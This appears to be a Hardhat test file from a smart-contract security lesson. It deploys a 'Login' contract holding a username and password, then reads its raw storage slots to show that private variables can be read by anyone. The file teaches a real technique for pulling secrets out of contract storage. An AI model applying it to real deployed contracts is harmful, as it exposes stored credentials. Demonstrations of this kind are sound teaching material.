import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", function () {
  it("Should be able to read the private data Password and Username", async function () {
    const loginFactory = await ethers.getContractFactory("Login");

    // To save space, we would convert the string to bytes32 array
    const usernameBytes = ethers.utils.formatBytes32String("test");
    const passwordBytes = ethers.utils.formatBytes32String("password");

    const loginContract = await loginFactory.deploy(
      usernameBytes,
      passwordBytes
    );
    await loginContract.deployed();

    const slot0Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      0
    );
    const slot1Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      1
    );

    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
  });
});
